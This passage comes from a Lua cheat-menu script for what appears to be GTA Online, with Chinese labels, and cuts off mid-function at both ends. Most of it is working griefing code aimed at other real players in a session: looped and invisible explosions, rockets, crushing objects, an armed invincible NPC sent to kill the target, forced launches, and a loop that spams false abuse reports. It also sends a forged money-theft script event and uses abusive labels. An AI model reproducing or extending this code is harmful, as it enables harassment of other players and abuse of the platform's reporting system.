        local y = math.random(-size, size)
        local z = 5

        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(dog, 1, x, y, z, true, false, true, true)
        AUDIO.PLAY_PAIN(dog, 7, 0)
    end
end
function fake_explosion(pid)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 0, true, true, 0)
end
function load_model(hash) -- lancescript
    local request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
local dwbz = menu.list(jindianegao, '生成畜生', {}, '')

    menu.action(dwbz, "狗炸", {}, "woof", function ()
        ped_explosion(pid, "a_c_retriever")
    end)

    menu.action(dwbz, "猫炸", {}, "Meow", function ()
        ped_explosion(pid, "a_c_cat_01")
    end)

    menu.action(dwbz, "假爆炸", {}, "Boom", function ()
        fake_explosion(pid)
    end)

    menu.action(jindianegao, "UFO 吸走", {}, "用UFO把他们吸到空中", function()  -- probaly could improve by EMPing the vehicle instead and figuring out how to have that beam
        local coords = players.get_position(pid)
        coords.z = coords.z + 63
        local ufoModel = MISC.GET_HASH_KEY("p_spinning_anus_s")
        local ufo = entities.create_object(ufoModel, coords)
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player, false)

        if PED.IS_PED_IN_VEHICLE(player, vehicle, false) then 
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            VEHICLE.BRING_VEHICLE_TO_HALT(vehicle, 3, 4, false)
            VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, false, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 65, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
            util.yield(6000)
            entities.delete_by_handle(ufo)
        else
            util.toast("玩家不在载具中") 
    end
    end)

    menu.toggle_loop(jindianegao, "火箭撞击", {}, "在玩家上方发射火箭", function()
        local coords = players.get_position(pid)
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords.x, coords.y, coords.z+10, coords.x, coords.y, coords.z, 1, true, -1312131151, playerPed, true, false, 50)
        util.yield(1500)
    end)

    menu.toggle_loop(jindianegao, "循环摔倒", {}, "保持玩家混乱", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 11, 1, false, true, 0, true)
        util.yield(10)
    end)

    menu.action(jindianegao, "摔倒", {}, "使玩家摔倒一次", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 11, 1, false, true, 0, true)
    end)

    menu.action(jindianegao, "陨石撞击", {}, "用陨石碾碎玩家", function() 
        local coords = players.get_position(pid)
        coords.z = coords.z + 15.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)

    menu.action(jindianegao, "随机惩罚", {}, "随机使用一种恶搞方式惩罚玩家", function()
    local chosenPunishment = math.random(5)
    if chosenPunishment == 1 then 
        util.toast(players.get_name(pid).. " 会被碎布玩偶！")
        local coords = players.get_position(pid)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 11, 1, false, true, 0, true) 
    end
    if chosenPunishment == 2 then 
        util.toast(players.get_name(pid).." 会被火箭击中！")
        local coords = players.get_position(pid)
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords.x, coords.y, coords.z+15, coords.x, coords.y, coords.z, 100, true, -1312131151, playerPed, true, false, 50)
    end
    if chosenPunishment == 3 then 
        util.toast(players.get_name(pid).." 会被删除载具！")
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(playerPed, true)
        entities.delete_by_handle(playerVehicle)
    end
    if chosenPunishment == 4 then 
        util.toast(players.get_name(pid).." 会被点燃！")
        local coords = players.get_position(pid)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 12, 0, true, false, 0, false)
    end
    if chosenPunishment == 5 then 
        util.toast(players.get_name(pid).." 幸免了！")
    end
    end)

local helpText = translate("Trolling", "该玩家不会看到你依附于他们")
	menu.toggle(jindianegao, translate("Trolling", "骑乘玩家"), {}, helpText, function (on)
		if players.user() == pid then return end
		usingPiggyback = on
		if usingPiggyback then
			usingRape = false
			local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pId)
			STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
			while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
				util.yield_once()
			end
			local boneId = PED.GET_PED_BONE_INDEX(target, 0xDD1C)
			ENTITY.ATTACH_ENTITY_TO_ENTITY(
				players.user_ped(),
				target,
				boneId,
				0.0, -0.2, 2.00,
				1.0, 1.0, 1,
				false, true, false, false, 0, true, 0)
			TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmjosh2", "josh_sitting_loop", 8.0, -8.0, -1, 1, 0.0, false, false, false)

			while usingPiggyback and is_player_active(pId, false, true) and
			not util.is_session_transition_active() do
				util.yield_once()
			end
			usingPiggyback = false
			TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
			ENTITY.DETACH_ENTITY(players.user_ped(), true, false)
		end
	end)

    menu.toggle(jindianegao, "依附到玩家", {}, '', function(on)
        if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) == players.user_ped() then 
            return
            notification("不能附加自己", colors.pink)
        end
        if on then
            ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        else
            ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
        end
    end)

local helpText = translate("Trolling", "传送到玩家身边")
	menu.toggle(jindianegao, translate("Trolling", "传送到玩家"), {}, helpText, function (on)
		if players.user() == pid then return end
		usingPiggyback = on
		if usingPiggyback then
			usingRape = false
			local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
			while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
				util.yield_once()
			end
			local boneId = PED.GET_PED_BONE_INDEX(target, 0xDD1C)
			ENTITY.ATTACH_ENTITY_TO_ENTITY(
				players.user_ped(),
				target,
				boneId,
				0.0, -0.2, 0.65,
				0.0, 0.0, 180.0,
				false, true, false, false, 0, true, 0)
			TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmjosh2", "josh_sitting_loop", 8.0, -8.0, -1, 1, 0.0, false, false, false)

			while usingPiggyback and is_player_active(pid, false, true) and
			not util.is_session_transition_active() do
				util.yield_once()
			end
			usingPiggyback = false
			TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
			ENTITY.DETACH_ENTITY(players.user_ped(), true, false)
		end
	end)

local mrplaym = menu.list(jindianegao, '在玩家身上下雨 ', {}, '')
local mir = {weap = 'WEAPON_SNOWBALL', speed = 1000}
local mirloop =  menu.toggle_loop(mrplaym, '类型:雪球', {'rain'}, '启用下雨', function ()
      local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
      local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
      local weap = util.joaat(mir.weap)
      Delcar(targets)
      WEAPON.REQUEST_WEAPON_ASSET(weap)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z - 2.0, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 1.0, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y , tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
  
      if not players.exists(pid) then
          if set.alert then
              util.toast('你让他们怒不可遏')
          end
          util.stop_thread()
      end
  end)
  
 menu.list_action(mrplaym, '类型', {''}, '更改在玩家身上下雨的类型', Weaplist, function(weapsel, text)
      mir.weap = Weap[weapsel]
      menu.set_menu_name(mirloop, '在玩家身上下雨 ' ..': '.. text)
  end)

 local weaspeed = menu.slider(mrplaym, '下雨速度', {''}, '更改下雨的速度', 100, 6000, 1000, 100, function (s)
      mir.speed = s
  end)

    local player_jinx_army = {}
    local army_player = menu.list(jindianegao, "宠物猫Jinx军队", {}, "整点小猫哄着你玩玩?\n删不掉的时候觉得烦的话换战局\n能少生成就少生成吧")
    menu.click_slider(army_player, "生成宠物猫Jinx军队", {}, "", 1, 256, 30, 1, function(val)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local jinx = util.joaat("a_c_cat_01")
        request_model(jinx)
        for i = 1, val do
            player_jinx_army[i] = entities.create_ped(28, jinx, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(player_jinx_army[i], true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_jinx_army[i], true)
            PED.SET_PED_COMPONENT_VARIATION(player_jinx_army[i], 0, 0, 1, 0)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_jinx_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
            util.yield()
        end 
    end)

    menu.action(army_player, "清除Jinx宠物猫", {}, "有几只清不掉的时候你就傻了 嘿嘿\n追着你喵喵叫 嘿嘿", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("a_c_cat_01")) then
                entities.delete_by_handle(ped)
            end
        end
    end)

    menu.toggle(jindianegao, "悲伤耶稣", {""}, "召唤耶稣攻击TA.", function(toggled)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local jesus = util.joaat("u_m_m_jesus_01")
        request_model(jesus)

        if toggled then
            jesus_ped = entities.create_ped(26, jesus, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(jesus_ped, true)
            WEAPON.GIVE_WEAPON_TO_PED(jesus_ped, util.joaat("WEAPON_RAILGUN"), 9999, true, true)
            PED.SET_PED_HEARING_RANGE(jesus_ped, 9999.0)
            PED.SET_PED_CONFIG_FLAG(jesus_ped, 281, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(jesus_ped, 5, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(jesus_ped, 46, true)
            PED.SET_PED_ACCURACY(jesus_ped, 100.0)
            PED.SET_PED_COMBAT_ABILITY(jesus_ped, 2)
            PED.SET_PED_CAN_RAGDOLL(jesus_ped, false)
        end

        while toggled do
            if PED.IS_PED_DEAD_OR_DYING(ped) then
                repeat
                    util.yield()
                until not PED.IS_PED_DEAD_OR_DYING(ped)
                local new_pos = players.get_position(pid)
                new_pos.y += 2
                new_pos.z += 1 -- 耶稣模型出于某种原因不断卡位,这样做是为了防止这种情况发生.
                util.yield(2500)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jesus_ped, new_pos, false, false, false)
                WEAPON.REFILL_AMMO_INSTANTLY(jesus_ped)
                TASK.TASK_COMBAT_PED(jesus_ped, ped, 0, 16)
            end
            util.yield()
        end
        if jesus_ped ~= nil then
            entities.delete_by_handle(jesus_ped)
        end
    end)

    menu.action(jindianegao, "弹射玩家", {}, "警告:这可能会导致崩溃出现,但概率极低.主要是由于垃圾邮件,所以请不要乱扔垃圾.", function()																																																	   
        local mdl = util.joaat("boxville3")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(mdl)
                    
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            util.toast("玩家在载具中. :/")
        return end
        
        if TASK.IS_PED_WALKING(ped) then
            boxville = entities.create_vehicle(mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
            ENTITY.SET_ENTITY_VISIBLE(boxville, false)
            util.yield(250)
            local force
            repeat
                if boxville ~= 0 and ENTITY.DOES_ENTITY_EXIST(boxville)then
                    ENTITY.APPLY_FORCE_TO_ENTITY(boxville, 1, 0.0, 0.0, 25.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                end
                util.yield()
                pos = ENTITY.GET_ENTITY_COORDS(ped)
            until pos.z > 10000.0
            util.yield(100)
            if boxville ~= 0 and ENTITY.DOES_ENTITY_EXIST(boxville) then 
                entities.delete_by_handle(boxville)
            end
        else
            util.toast("玩家必须在行走时才能发挥作用. :/")
        end
    end)

  local eplaym = menu.list(jindianegao, '爆炸玩家', {}, '')
-------------------------------------
local exset = {exsel = 0, scale = 1000, isaud = true, invis = false, shake = 0, damage = false, delay = 1}
local exloop = menu.toggle_loop(eplaym, '类型:手榴弹', {'EXPL'}, '循环爆炸玩家', function ()
     local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
     local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)


     FIRE.ADD_EXPLOSION(tar1.x, tar1.y, tar1.z - 1, exset.exsel, exset.scale, exset.isaud, exset.invis, exset.shake, exset.damage)
     FIRE.ADD_EXPLOSION(tar1.x, tar1.y, tar1.z - 0.5, exset.exsel, exset.scale, exset.isaud, exset.invis, exset.shake, exset.damage)
     FIRE.ADD_EXPLOSION(tar1.x, tar1.y, tar1.z, exset.exsel, exset.scale, exset.isaud, exset.invis, exset.shake, exset.damage)
     FIRE.ADD_EXPLOSION(tar1.x, tar1.y, tar1.z + 0.5, exset.exsel, exset.scale, exset.isaud, exset.invis, exset.shake, exset.damage)
     util.yield(exset.delay)

     if not players.exists(pid) then
         if set.alert then
             util.toast('你让他们怒不可遏')
         end
         util.stop_thread()
     end
 end)


 menu.list_action(eplaym, '更改爆炸类型', {''}, '更改爆炸玩家的类型', bmobdifficent,function(index, text)
     menu.set_menu_name(exloop, '循环爆炸类型 ' ..': '.. text)
     exset.exsel = index - 1
 end)

 menu.slider(eplaym, '更改爆炸大小', {''}, '更改爆炸玩家的大小', 100, 6000, 1000, 100, function (s)
     exset.scale = s
  end)

  menu.toggle(eplaym, '隐形爆炸', {''}, '让玩家看不见爆炸', function (on)
     exset.invis = on
 end)

 menu.toggle(eplaym, '无声爆炸', {''}, '让玩家听不见爆炸', function (on)
     exset.isaud = not on
 end)

 menu.slider(eplaym, '晃动视角数值', {''}, '调整由爆炸引起的视角晃动数值', 0, 100, 0, 10, function (sh)
     exset.shake = sh
  end)

  menu.toggle(eplaym, '无伤爆炸', {''}, '让玩家受不到爆炸伤害', function (on)
     exset.damage = on
 end)

 menu.slider(eplaym, '延迟', {''}, '调成距离上一次爆炸的延迟', 0, 1000, 100, 10, function (de)
     exset.delay = de
  end)

-------------------------------------------------

    menu.toggle_loop(jindianegao,"切割机", {'qiegeji'},"用直升飞机的螺旋桨对玩家进行砍杀.", function(click_type)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.z = coords['z']+2.5
        local hash = util.joaat("buzzard")
        request_model_load(hash)
        local heli = entities.create_vehicle(hash, coords, ENTITY.GET_ENTITY_HEADING(target_ped))
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, false)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
        ENTITY.SET_ENTITY_INVINCIBLE(heli, true)
        ENTITY.FREEZE_ENTITY_POSITION(heli, true)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(heli, true, true)
        ENTITY.SET_ENTITY_ROTATION(heli, 180, 0.0, ENTITY.GET_ENTITY_HEADING(target_ped), 0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(heli, coords.x, coords.y, coords.z, true, false, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
    end)

        local explosion_circle_angle = 0
        menu.toggle_loop(jindianegao, "爆炸圈", {}, "在他周围生成爆炸圈", function ()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        explosion_circle(ped, explosion_circle_angle, 25)
        explosion_circle_angle += 0.15

        util.yield(50)
    end)

    menu.toggle(jindianegao, '混合恶搞', {}, '同时启用Ped笼子,物体笼子,循环爆炸来恶搞玩家', function (on)
        if on then
        menu.trigger_commands("EXPL".. players.get_name(pid))
        menu.trigger_commands("PCAGE".. players.get_name(pid))
        menu.trigger_commands("ObjCage".. players.get_name(pid))
        else
        menu.trigger_commands("EXPL".. players.get_name(pid))
        menu.trigger_commands("FreePedcage".. players.get_name(pid))
        menu.trigger_commands("FreeObjcage".. players.get_name(pid))
        end
    end)

    menu.toggle(jindianegao, '发射烟花', {}, '弹飞玩家并把玩家变成烟花炸飞', function (on)
        if on then
        menu.set_value(weaspeed, 100)
        mir.weap = 'weapon_firework'
        menu.trigger_commands("rain".. players.get_name(pid))
        menu.trigger_commands("JuggleC".. players.get_name(pid))
        else
        menu.trigger_commands("rain".. players.get_name(pid))
        menu.trigger_commands("JuggleC".. players.get_name(pid))
        end
    end)

    menu.toggle_loop(jindianegao, "砸死他", {}, "用陨石砸死他", function() 
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 15.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)

    menu.action(jindianegao, "大爆炸", {}, "炸死他爷爷的", function() 
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, 0, 0)
        local defx = 0
        local defy = 0
        local defz = 0
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defx = defx + 2
        defy = defy + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    end)

    xunhaunshijian = menu.list(jindianegao, "循环事件", {}, "", function(); end)
    menu.toggle_loop(xunhaunshijian, "循环喷火", {"flameloop"}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z - 2.0, 12, 1, true, false, 0, false)
    end)

    menu.toggle_loop(xunhaunshijian, "循环喷火V2", {""}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(xunhaunshijian, "循环喷水", {"waterloop"}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z - 2.0, 13, 1, true, false, 0, false)
    end)

    menu.toggle_loop(xunhaunshijian, "循环喷水V2", {""}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(xunhaunshijian, "循环放屁", {"fangpi"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 24, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(xunhaunshijian, "循环小爆炸", {"xbaozha"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 25, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(xunhaunshijian, "循环大爆炸", {"dbaozha"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 6, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(xunhaunshijian, "循环气场爆炸", {""}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 26, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(xunhaunshijian, "循环闪闪发光", {"fgv2"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 22, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(xunhaunshijian, "循环机枪爆炸", {""}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 45, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(xunhaunshijian, "循环炸裂", {"fgv2"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 23, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(xunhaunshijian, "循环烟雾", {"flameloop"}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z - 1.0, 20, 1, true, false, 0, false)
    end)

    menu.toggle_loop(xunhaunshijian,"循环电击枪", {"stungunloop"}, "在此玩家周围生成电击枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        for i = 1, 50 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
        end
        util.yield(100)
    end)

    menu.toggle_loop(xunhaunshijian,"循环原子能枪", {"atomicgunloop"}, "在此玩家周围生成原子能枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z - 0.3, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_raypistol"), players.user_ped(), true, false, 1.0)
        util.yield(250)
    end)

    menu.toggle_loop(xunhaunshijian, "随机循环", {"randomloop"}, "经典恶搞之一", function(on)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false, 0.0)
    end)

	menu.toggle(xunhaunshijian,"循环举报", {"reportthenoob"}, "会变卡", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)

    menu.click_slider(jindianegao, "虚假抢钱", {}, "", 0, 2147483647, 0, 1000, function(amount)
        util.trigger_script_event(1 << pid, {548471420, players.user(), 532932991, amount, 0, 0, 0, 0, 0, 0, pid, players.user(), 0, 0})
        util.trigger_script_event(1 << players.user(), {548471420, players.user(), 532932991, amount, 0, 0, 0, 0, 0, 0, pid, players.user(), 0, 0})
    end)

    player_toggle_loop(jindianegao, pid, "电死这个杂种", {tase}, "来自雷电法王杨永信的电疗\n拯救网瘾少年的任务就交给你了", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        for i = 1, 50 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
        end
        util.yield()
    end)
    
    local griefing = menu.list(jindianegao, "坏逼选项", {}, "你是个坏b，你不干净了。")
    local glitch_player_list = menu.list(griefing, "鬼畜玩家", {"glitchdelay"}, "")
    local object_stuff = {
        names = {
            "摩天轮",
            "UFO",
            "水泥搅拌车",
            "脚手架",
            "车库门",
            "保龄球",
            "足球",
            "橘子",
            "特技坡道",

        },
        objects = {
            "prop_ld_ferris_wheel",
            "p_spinning_anus_s",
            "prop_staticmixer_01",
            "prop_towercrane_02a",
            "des_scaffolding_root",
            "prop_sm1_11_garaged",
            "stt_prop_stunt_bowling_ball",
            "stt_prop_stunt_soccer_ball",
            "prop_juicestand",
            "stt_prop_stunt_jump_l",
        }
    }
    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "物体", {"glitchplayer"}, "选择鬼畜玩家使用的物体.", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.slider(glitch_player_list, "物体生成延迟", {"spawndelay"}, "", 150, 3000, 150, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer
    glitchPlayer = player_toggle_loop(glitch_player_list, pid, "鬼畜玩家", {"glitchplayer"}, "被具有实体垃圾邮件保护功能的菜单所阻止.", function()
